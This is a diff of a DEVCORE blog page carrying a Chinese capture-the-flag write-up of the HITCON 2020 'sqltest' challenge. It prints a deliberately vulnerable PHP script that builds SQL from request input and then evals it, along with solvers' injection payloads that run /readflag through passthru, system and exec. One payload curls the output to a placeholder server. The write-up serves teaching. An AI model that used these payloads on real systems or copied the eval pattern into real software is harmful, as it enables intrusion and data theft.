@@ -1,12 +1,21 @@
 
+
 <!DOCTYPE html>
-<html lang="zh-TW">
-  <head>
+<html class="no-js sub-menu">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
     <meta charset="utf-8" />
-    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible" />
-    <meta content="width=device-width, initial-scale=1" name="viewport" />
-    <title>DEVCORE Wargame at HITCON 2020 | DEVCORE 戴夫寇爾</title><link href="/assets/themes/devcore-v2/stylesheets/webpack_bundle.css" rel="stylesheet" />
-    <link href="/assets/themes/devcore-v2/images/favicon.png" rel="icon" size="32x32">
+    <!-- web fullscreen -->
+    <meta name="apple-mobile-web-app-capable" content="yes"><!-- ios -->
+    <meta name="mobile-web-app-capable" content="yes"><!-- android -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0" />
+    <meta name="format-detection" content="telephone=no">
+    <title>DEVCORE Wargame at HITCON 2020 | DEVCORE 戴夫寇爾</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <script src="/js/modernizr-custom.js"></script>
+    <script src="/js/jquery-3.6.0.min.js"></script>
+    <script src="/js/site.js"></script>
     <meta name="description" property="og:description" content="HITCON 2020 DEVCORE Wargame 其中一題 sqltest 解析。需要構造一個字串，同時為合法的 SQL 語句與 PHP 語句，讓 SQL 執行時有回傳值且 PHP 執行時能夠執行任意系統指令。" />
     <meta name="keywords" content="wargame, sqltest" />
     <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
@@ -30,80 +39,519 @@
     <link rel="canonical" href="https://devco.re/blog/2020/10/30/devcore-wargame-at-hitcon-2020/"/>
     <link rel="alternate" type="application/rss+xml" title="DEVCORE 戴夫寇爾" href="https://devco.re/rss">
 
-    <!-- Google Tag Manager -->
-    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
-    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
-    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
-    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
-    })(window,document,'script','dataLayer','GTM-K5B8NW');</script>
-    <!-- End Google Tag Manager -->
-  </head>
-  <body>
-    <div class="page">
-      <div class="container--wrapper">
-        <div class="topbar">
-          <div class="topbar__brand">
-            <a href="/">
-                <div class="logo">
-                  DEVCORE 戴夫寇爾
-                </div></a>
-            <p class="slogan">
-              我們提供<a href="/services/penetration-test" class="link">滲透測試</a>、<a href="/services/red-team" class="link">紅隊演練</a>、<a href="/services/security-consulting" class="link">資安顧問</a>與<a href="/services/security-training" class="link">教育訓練</a>服務
-            </p>
-          </div>
-          <div class="drawer" id="drawer">
-            <div class="drawer__container">
-              <nav class="main-menu">
-                <div class="hidden">
-                  主選單
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-GHXJ9PS005"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-GHXJ9PS005');
+    </script>
+    <link rel="stylesheet" href="/fonts/inter.css" />
+    <link rel="stylesheet" href="/css/highlighter.css" />
+    <!-- <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script> -->
+</head>
+<body>
+    <!-- 導覽列 start -->
+    <header class="header">
+<div class="container">
+    <!-- logo start -->
+    <div class="logo">
+        <a href="/">
+            <img src="/images/logo.svg"/>
+        </a>
+    </div>
+    <!-- logo end -->
+    <!-- 主選單 start -->
+    <nav class="nav">
+        <ul class="menu">
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>服務<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/services/red-team/">
+                            <div class="item">
+
+                                <h2>
+                                    <i class="icon menu service-red-team"></i>
+                                    紅隊演練
+                                </h2>
+                                <p class="two-line">
+                                    在不影響企業營運前提下，無所不用其極，從各種進入點執行模擬入侵攻擊，達成企業指定的演練情境。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/services/penetration-test/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-penetration-test"></i>
+                                    滲透測試
+                                </h2>
+                                <p class="two-line">
+                                    以駭客思維及手法嘗試入侵企業指定系統，找出潛在漏洞，驗證企業資料與設備是否可被竊取或破壞。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/services/security-consulting/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-security-consulting"></i>
+                                    資安顧問服務
+                                </h2>
+                                <p class="two-line">
+                                    以紅隊演練為基礎，提供攻擊者視角與可能入侵路徑，協助企業評估資安資源優先順序，並擬定長期防禦策略。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/services/security-training/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu service-security-training"></i>
+                                    資安教育訓練
+                                </h2>
+                                <p class="two-line">
+                                    從攻擊思維出發，協助企業有效預防資安事故並防禦；以及事件發生時，如何快速判定攻擊目的、手法、漏洞與及應變方式。
+                                </p>
+                            </div>
+                        </a>
+
+                    </div>
                 </div>
-                <a href="/services/penetration-test" class="main-menu__link mobile-only">滲透測試</a>
-                <a href="/services/red-team" class="main-menu__link mobile-only">紅隊演練</a>
-                <a href="/services/security-consulting" class="main-menu__link mobile-only">資安顧問</a>
-                <a href="/services/security-training" class="main-menu__link mobile-only">教育訓練</a>
-                <a href="/about/" class="main-menu__link">駭客思維</a><a href="/blog/" class="main-menu__link">最新訊息</a><a href="/search/" class="main-menu__link main-menu__search desktop-only"><span class="hidden">搜尋</span><svg class="icon-search icon"><use xlink:href="#icon-search" /></svg></a>
-              </nav>
-              <a href="/contact/" class="drawer__contact button--dense">聯絡我們</a>
-              <nav class="lang-menu">
-                <div class="lang-menu__label">
-                  語言:
+            </li>
+
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>研究<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/research/overview/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu search-circle"></i>
+                                    總覽概要
+                                </h2>
+                                <p class="two-line">
+                                    持續精研資安最新技術及漏洞研究趨勢，全方位檢測企業產品安全性、吸取經驗並轉化為紅隊演練工具與手法。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/research/awards/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu badge-check"></i>
+                                    競賽與獎項
+                                </h2>
+                                <p class="two-line">
+                                    國際級資訊安全競賽獎項肯定。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/research/bug-bounty/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu puzzle"></i>
+                                    企業漏洞回報
+                                </h2>
+                                <p class="two-line">
+                                    研究企業系統中的資安風險及各種可能的突破口，並通報企業修補。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/research/talks/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu globe"></i>
+                                    國際研討會
+                                </h2>
+                                <p class="two-line">
+                                    參與全球資安盛會，發表、交流漏洞的知識與資訊。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/research/cve/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu view-list"></i>
+                                    CVE 漏洞列表
+                                </h2>
+                                <p class="two-line">
+                                    挖掘並回報國際知名產品與服務的重大漏洞。
+                                </p>
+                            </div>
+                        </a>
+                    </div>
                 </div>
-                <a href="/" class="lang-menu__link">中文</a>
-                <a href="/en/" class="lang-menu__link">English</a>
-              </nav>
+
+
+            </li>
+
+            <li class="dropdown">
+                <div class="menuLable" href="#">
+                    <span>公司<i class="icon arrow_down"></i></span>
+
+                    <div class="menuItem">
+                        <a href="/company/about/">
+                        <div class="item">
+                            <h2>
+                                <i class="icon menu company"></i>
+                                公司簡介
+                            </h2>
+                            <p>
+                                DEVCORE 戴夫寇爾由世界級白帽駭客團隊創立，提供紅隊演練、滲透測試、資安顧問服務、資安教育訓練等服務。
+                            </p>
+                        </div>
+                        </a>
+                        <a href="/company/our-team/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu team"></i>
+                                    團隊成員
+                                </h2>
+                                <p class="two-line">
+                                    由熱衷挑戰、具備駭客思維的資安專家組成，專注於創新攻擊手法研究，並以「高道德、高自律、高嚴謹」為最高指導原則。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/company/history/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu milestone"></i>
+                                    成就與沿革
+                                </h2>
+                                <p class="two-line">
+                                    長期聚焦於攻擊研究，屢屢獲邀參與全球知名資安研討會，已揭露數百個重要產品漏洞、協助企業提升防禦能量。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/company/csr/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu heart"></i>
+                                    企業社會責任
+                                </h2>
+                                <p class="two-line">
+                                    提供多元實習管道和研習計畫，提升新世代人才資安能量，推廣資訊安全意識。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/company/jobs/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu briefcase"></i>
+                                    工作機會
+                                </h2>
+                                <p class="two-line">
+                                    加入 DEVCORE，共同改善資安產業結構，與我們一起打造更安全的世界。
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </li>
+            <li class="dropdown">
+                <div class="menuLable">
+                    <span>新聞<i class="icon arrow_down"></i></span>
+                    <div class="menuItem">
+                        <a href="/blog/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu newspaper"></i>
+                                    BLOG
+                                </h2>
+                                <p>
+                                    DEVCORE 最新消息。
+                                </p>
+                            </div>
+                        </a>
+                        <a href="/media-kit/">
+                            <div class="item">
+                                <h2>
+                                    <i class="icon menu download"></i>
+                                    媒體素材下載
+                                </h2>
+                                <p>
+                                    使用 DEVCORE 商標須遵循的使用規範。
+                                </p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </li>
+            <li>
+                <a class="menuLable" href="/search/">搜尋</a>
+            </li>
+            <li>
+                <a class="menuLable" href="/contact/">聯絡我們</a>
+            </li>
+        </ul>
+    </nav>
+    <!-- 主選單 end -->
+</div>
+
+
+<!-- 手機板選單  start-->
+<nav class="nav-m" id="menu-m">
+    <ul class="menu">
+        <li>
+            <div class="menuLable">
+                <span>服務</span>
+                <div class="menuItem">
+                    <a href="/services/red-team/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-red-team"></i>
+                                紅隊演練
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/services/penetration-test/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-penetration-test"></i>
+                                滲透測試
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/services/security-consulting/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-security-consulting"></i>
+                                顧問服務
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/services/security-training/" class="fullwidth">
+                        <div class="item">
+                            <h2>
+                                <i class="icon service-security-training"></i>
+                                教育訓練
+                            </h2>
+                        </div>
+                    </a>
+                </div>
             </div>
-          </div><span class="topbar__menu mobile-only">menu</span><button class="appearance-none topbar__hamburger mobile-only" data-toggle="#drawer" id="drawer-toggle" type="button">
-            <div class="bars">
-              <div class="bar"></div>
-              <div class="bar"></div>
-              <div class="bar"></div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span>資安研究</span>
+                <div class="menuItem">
+                    <a href="/research/overview/" class="fullwidth">
+                        <div class="item">
+                            <h2>總覽概要</h2>
+                        </div>
+                    </a>
+                    <a href="/research/awards/">
+                        <div class="item">
+                            <h2>競賽與獎項</h2>
+                        </div>
+                    </a>
+                    <a href="/research/bug-bounty/">
+                        <div class="item">
+                            <h2>Bug Bounty</h2>
+                        </div>
+                    </a>
+                    <a href="/research/talks/">
+                        <div class="item">
+                            <h2>國際研討會</h2>
+                        </div>
+                    </a>
+                    <a href="/research/cve/">
+                        <div class="item">
+                            <h2>CVE 漏洞列表</h2>
+                        </div>
+                    </a>
+                </div>
             </div>
-          </button>
+        </li>
+
+        <li>
+            <div class="menuLable">
+                <span>公司</span>
+                <div class="menuItem">
+                    <a href="/company/about/" class="fullwidth">
+                        <div class="item">
+                            <h2>公司簡介</h2>
+                        </div>
+                    </a>
+                    <a href="/company/our-team/">
+                        <div class="item">
+                            <h2>團隊成員</h2>
+                        </div>
+                    </a>
+                    <a href="/company/history/">
+                        <div class="item">
+                            <h2>成就與沿革</h2>
+                        </div>
+                    </a>
+                    <a href="/company/csr/">
+                        <div class="item">
+                            <h2>企業社會責任</h2>
+                        </div>
+                    </a>
+                    <a href="/company/jobs/">
+                        <div class="item">
+                            <h2>工作機會</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span>新聞</span>
+                <div class="menuItem">
+                    <!-- <a href="/blog/">
+                    <div class="item">
+                        <h2>所有文章</h2>
+                    </div>
+                    </a> -->
+                    <!-- <a href="">
+                        <div class="item">
+                            <h2>案例剖析</h2>
+                        </div>
+                    </a> -->
+                    <!-- <a href="">
+                        <div class="item">
+                            <h2>科普文章</h2>
+                        </div>
+                    </a>
+                    <a href="">
+                        <div class="item">
+                            <h2>技術專欄</h2>
+                        </div>
+                    </a>
+                    <a href="">
+                        <div class="item">
+                            <h2>資安新聞</h2>
+                        </div>
+                    </a> -->
+                    <a href="/blog/">
+                        <div class="item">
+                            <h2>BLOG</h2>
+                        </div>
+                    </a>
+                    <a href="/media-kit/">
+                        <div class="item">
+                            <h2>媒體素材下載</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <div class="menuItem">
+                    <a href="/search/" class="fullwidth">
+                        <div class="item">
+                            <h2 class="center">
+                                <i class="icon search"></i>
+                                搜尋
+                            </h2>
+                        </div>
+                    </a>
+                    <a href="/contact/" class="fullwidth">
+                        <div class="item">
+                            <h2 class="center">
+                                <i class="icon chat-alt"></i>
+                                聯絡我們
+                            </h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+        <li>
+            <div class="menuLable">
+                <span><i class="icon translate"></i>Language</span>
+                <div class="menuItem">
+                    <a href="/">
+                    <div class="item">
+                        <h2>中文</h2>
+                    </div>
+                    </a>
+                    <a href="/en">
+                        <div class="item">
+                            <h2>English</h2>
+                        </div>
+                    </a>
+                </div>
+            </div>
+        </li>
+    </ul>
+</nav>
+<!-- 手機板選單  end-->
+    </header>
+    <!-- 導覽列 end -->
+
+    <!-- tab 選單 start -->
+    <div class="sub-nav">
+        <div class="container">
+            <h1>BLOG</h1>
+            <ul class="tab">
+                <li>
+                    <a href="/blog/">所有文章</a>
+                </li>
+                <li>
+                    <a href="/blog/category/最新消息/">最新消息</a>
+                </li>
+                <li>
+                    <a href="/blog/category/技術專欄/">技術專欄</a>
+                </li>
+                <li>
+                    <a href="/blog/category/科普文章/">科普文章</a>
+                </li>
+                <li>
+                    <a href="/blog/category/資安新聞/">資安新聞</a>
+                </li>
+                <li>
+                    <a href="/media-kit/">媒體素材下載</a>
+                </li>
+            </ul>
         </div>
-      </div><main role="main">
+    </div>
+    <!-- tab 選單 end -->
+    
+    <div class="main">
+        <!-- 文章外層layer -->
+        <section class="narrow">
+            <!-- 文章 start -->
+            <article class="article_body">
+                <div class="content">
+                    <a class="category" href="/blog/category/技術專欄">技術專欄</a>
+                    <span class="tag">
 
+                      <a href="/blog/tag/PHP/">#PHP</a> <a href="/blog/tag/RCE/">#RCE</a> 
+                    </span>
+                    <h1>
+                        DEVCORE Wargame at HITCON 2020
+                    </h1>
+                    
+                    
+                    <div class="author_detail">
+                        <span class="avatar">
+                            <a href="/blog/author/cyku">
+                                <div class="circle">
+                                    <i class="user" style="background-image: url('/assets/img/avatar/orig/cyku.png');" ></i>
+                                </div>
+                            </a>
+                        </span>
+                        <span class="author"><a href="/blog/author/cyku">Cyku</a></span>
+                        <span class="date">2020-10-30</span>
+                    </div>
+                    
+                    
+                    <div class="article_img">
+                        <img src="https://devco.re/assets/img/blog/20201030/cover.png"/>
+                    </div>
+                    
 
-          <div class="container--wrapper">
-            <div class="container">
-              <section class="blog-header">
-                <small class="blog-header__category"><a href="/blog/category/技術專欄/">技術專欄</a></small>
-                <img src="https://devco.re/assets/img/blog/20201030/cover.png" class="blog-header__image" alt="DEVCORE Wargame at HITCON 2020" />
-                <h1 class="blog-header__title">
-                  DEVCORE Wargame at HITCON 2020
-                </h1>
-                <div class="blog-header__tags">
-                  
-                  <a href="/blog/tag/PHP/" class="blog-header__tag">PHP</a><a href="/blog/tag/RCE/" class="blog-header__tag">RCE</a>
-                </div>
-          
-          
-                <p class="blog-header__info">
-                  By <span class="blog-author-photo" style="background-image: url(/assets/themes/devcore-v2/images/avatar/cyku.jpg)"></span> <a href="/blog/author/cyku" class="author-name">Cyku</a> <time class="date">on 2020-10-30 </time>
-                </p>
-          
-              </section>
-              <article class="article">
-          <style type="text/css">
+                    <hr>
+
+                    <!-- 文章內容 -->
+                    <div class="article_content">
+<style type="text/css">
     table {
         display: block;
         width: 100%;
@@ -135,7 +583,7 @@
 
 <p>搭晚安～一年一度的資安圈大拜拜活動之一 HITCON 2020 在約一個月前順利落幕啦，今年我們照舊在攤位準備了幾道小小的 Wargame 給會眾朋友們挑戰自身技術，並同樣準備了幾份精美小禮物送給挑戰成功的朋友們。</p>
 
-<p>總計活動兩天間有登入並提交至少一把 flag 的人數為 92 人，非常感謝大家踴躍地參與，這次未能成功在時間內完成挑戰而未領到小禮物的朋友們也別太灰心，為了能更多的回饋社群，所以我們決定寫一篇技術文章介紹本次 Wargame 的其中一道開放式題目<code class="highlighter-rouge">sqltest</code>，為此我們在活動後詢問了所有解題的人，收集了大家的解法與思路，並將在文章的接下來一一為大家介紹！</p>
+<p>總計活動兩天間有登入並提交至少一把 flag 的人數為 92 人，非常感謝大家踴躍地參與，這次未能成功在時間內完成挑戰而未領到小禮物的朋友們也別太灰心，為了能更多的回饋社群，所以我們決定寫一篇技術文章介紹本次 Wargame 的其中一道開放式題目<code class="language-plaintext highlighter-rouge">sqltest</code>，為此我們在活動後詢問了所有解題的人，收集了大家的解法與思路，並將在文章的接下來一一為大家介紹！</p>
 
 <h2 id="sqltest-題目說明">sqltest 題目說明</h2>
 
@@ -164,8 +612,8 @@
 
 <p><strong>readflag.c</strong></p>
 
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
 </span>
 <span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
     <span class="n">seteuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
@@ -177,33 +625,33 @@
 <span class="p">}</span>
 </code></pre></div></div>
 
-<p>上述前半部為環境的佈置，真正題目的開始則要見下方 index.php，其中 <code class="highlighter-rouge">$_REQUEST</code> 是我們可以任意控制的參數，題目除了 isset 外並無其他任何檢查，隨後第 8 行中參數被帶入 SQL 語句作執行，如果 SQL 執行成功並且有查詢到資料，就會進入 15 行開始的處理，來自 <code class="highlighter-rouge">$_REQUEST</code> 的 <code class="highlighter-rouge">$column</code> 變數再次被使用並傳入 eval 作執行，這樣看下來題目的解題思路就很清楚了，我們需要構造一個字串，同時為合法的 SQL 語句與 PHP 語句，讓 SQL 執行時有回傳值且 PHP 執行時能夠執行任意系統指令，就能 getshell 並呼叫 /readflag 取得 flag！</p>
+<p>上述前半部為環境的佈置，真正題目的開始則要見下方 index.php，其中 <code class="language-plaintext highlighter-rouge">$_REQUEST</code> 是我們可以任意控制的參數，題目除了 isset 外並無其他任何檢查，隨後第 8 行中參數被帶入 SQL 語句作執行，如果 SQL 執行成功並且有查詢到資料，就會進入 15 行開始的處理，來自 <code class="language-plaintext highlighter-rouge">$_REQUEST</code> 的 <code class="language-plaintext highlighter-rouge">$column</code> 變數再次被使用並傳入 eval 作執行，這樣看下來題目的解題思路就很清楚了，我們需要構造一個字串，同時為合法的 SQL 語句與 PHP 語句，讓 SQL 執行時有回傳值且 PHP 執行時能夠執行任意系統指令，就能 getshell 並呼叫 /readflag 取得 flag！</p>
 
 <p><strong>index.php</strong></p>
 
 <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
-<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"column"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"id"</span><span class="p">]))</span> <span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"column"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"id"</span><span class="p">]))</span> <span class="p">{</span>
     <span class="k">die</span><span class="p">(</span><span class="s1">'No input'</span><span class="p">);</span>
 <span class="p">}</span>
 
 <span class="nv">$column</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"column"</span><span class="p">];</span>
 <span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"id"</span><span class="p">];</span>
-<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"select "</span><span class="o">.</span><span class="nv">$column</span><span class="o">.</span><span class="s2">" from mytable where id ='"</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s2">"'"</span> <span class="p">;</span>
+<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"select "</span><span class="mf">.</span><span class="nv">$column</span><span class="mf">.</span><span class="s2">" from mytable where id ='"</span><span class="mf">.</span><span class="nv">$id</span><span class="mf">.</span><span class="s2">"'"</span> <span class="p">;</span>
 
 <span class="nv">$conn</span> <span class="o">=</span> <span class="nb">mysqli_connect</span><span class="p">(</span><span class="s1">'mysql'</span><span class="p">,</span> <span class="s1">'user'</span><span class="p">,</span> <span class="s1">'youtu.be/l11uaEjA-iI'</span><span class="p">,</span> <span class="s1">'sqltest'</span><span class="p">);</span>
 
-<span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
+<span class="nv">$result</span> <span class="o">=</span> <span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
 <span class="k">if</span> <span class="p">(</span> <span class="nv">$result</span> <span class="p">){</span>
-    <span class="k">if</span> <span class="p">(</span> <span class="nx">mysqli_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
-        <span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_object</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
-        <span class="nv">$str</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\$</span><span class="s2">output = </span><span class="se">\$</span><span class="s2">row-&gt;"</span><span class="o">.</span><span class="nv">$column</span><span class="o">.</span><span class="s2">";"</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="nf">mysqli_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$row</span> <span class="o">=</span> <span class="nf">mysqli_fetch_object</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+        <span class="nv">$str</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\$</span><span class="s2">output = </span><span class="se">\$</span><span class="s2">row-&gt;"</span><span class="mf">.</span><span class="nv">$column</span><span class="mf">.</span><span class="s2">";"</span><span class="p">;</span>
         <span class="k">eval</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
     <span class="p">}</span>
 <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
     <span class="k">die</span><span class="p">(</span><span class="s1">'Database error'</span><span class="p">);</span>
 <span class="p">}</span>
 
-<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$output</span><span class="p">))</span> <span class="p">{</span>
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$output</span><span class="p">))</span> <span class="p">{</span>
     <span class="k">echo</span> <span class="nv">$output</span><span class="p">;</span>
 <span class="p">}</span>
 </code></pre></div></div>
@@ -214,15 +662,15 @@
 
 <p><strong>exploit:</strong></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column={passthru('/readflag')}&amp;id=1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column={passthru('/readflag')}&amp;id=1
 
 SQL: SELECT {passthru('/readflag')} FROM mytable WHERE id = '1'
 PHP: $output = $row-&gt;{passthru('/readflag')};
 </code></pre></div></div>
 
-<p>這個解法利用了 MySQL 一個相容性的特性，<code class="highlighter-rouge">{identifier expr}</code> 是 ODBC Escape 語法，MySQL 相容了這個語法，使得在語句中出現時不會導致語法錯誤，因此我們可以構造出 <code class="highlighter-rouge">SELECT {passthru '/readflag'} FROM mytable WHERE id = '1'</code> 字串仍然會是合法的 SQL 語句，更進一步地嘗試將 ODBC Escape 中的空白移除改以括號包夾字串的話，會變成 <code class="highlighter-rouge">SELECT {passthru('/readflag')} FROM mytable WHERE id = '1'</code>，由於 MySQL 提供的語法彈性，此段語句仍然會被視為合法並且可正常執行得到相同結果。</p>
+<p>這個解法利用了 MySQL 一個相容性的特性，<code class="language-plaintext highlighter-rouge">{identifier expr}</code> 是 ODBC Escape 語法，MySQL 相容了這個語法，使得在語句中出現時不會導致語法錯誤，因此我們可以構造出 <code class="language-plaintext highlighter-rouge">SELECT {passthru '/readflag'} FROM mytable WHERE id = '1'</code> 字串仍然會是合法的 SQL 語句，更進一步地嘗試將 ODBC Escape 中的空白移除改以括號包夾字串的話，會變成 <code class="language-plaintext highlighter-rouge">SELECT {passthru('/readflag')} FROM mytable WHERE id = '1'</code>，由於 MySQL 提供的語法彈性，此段語句仍然會被視為合法並且可正常執行得到相同結果。</p>
 
-<p>接著再看進到 eval 前會構造出這樣的 PHP 語句：<code class="highlighter-rouge">$output = $row-&gt;{passthru('/readflag')}</code>，由於 PHP 在語法上也提供了極大的彈性，使得我們可以利用 <code class="highlighter-rouge">$object-&gt;{ expr }</code> 這樣的語法將 expr 敘述句動態執行完的結果作為物件屬性名稱去存取物件的屬性，因此結果就會呼叫 passthru 函式執行系統指令。</p>
+<p>接著再看進到 eval 前會構造出這樣的 PHP 語句：<code class="language-plaintext highlighter-rouge">$output = $row-&gt;{passthru('/readflag')}</code>，由於 PHP 在語法上也提供了極大的彈性，使得我們可以利用 <code class="language-plaintext highlighter-rouge">$object-&gt;{ expr }</code> 這樣的語法將 expr 敘述句動態執行完的結果作為物件屬性名稱去存取物件的屬性，因此結果就會呼叫 passthru 函式執行系統指令。</p>
 
 <p>這邊補充一個冷知識，當想到系統指令時，大家直覺可能會想到使用 system 函式，但是 MySQL 在 8.0.3 中將 system 加入關鍵字保留字之中，而這題目環境是使用 MySQL 8.0 架設的，所以如果使用 system 的話反而會失敗唷！</p>
 
@@ -234,7 +682,7 @@ PHP: $output = $row-&gt;{passthru('/readflag')};
 
 <p><strong>by Mico (https://www.facebook.com/MicoDer/):</strong></p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column={exec(%27curl%20http://Mico_SRV/?`/readflag`%27)};%23&amp;id=1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column={exec(%27curl%20http://Mico_SRV/?`/readflag`%27)};%23&amp;id=1
 
 SQL: SELECT {exec('curl http://Mico_SRV/?`/readflag`')};# FROM mytable WHERE id = '1'
 PHP: $output = $row-&gt;{exec('curl http://Mico_SRV/?`/readflag`')};#;
@@ -248,7 +696,7 @@ PHP: $output = $row-&gt;{exec('curl http://Mico_SRV/?`/readflag`')};#;
 
 <p><strong>by LJP (https://ljp-tw.github.io/blog/)</strong>:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=id%0a-- /*%0a-- */ ; system('/readflag');%0a&amp;id=1
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>QueryString: column=id%0a-- /*%0a-- */ ; system('/readflag');%0a&amp;id=1
 
 SQL: SELECT id
      -- /*
@@ -260,125 +708,125 @@ PHP: $output = id
      ;
 </code></pre></div></div>
 
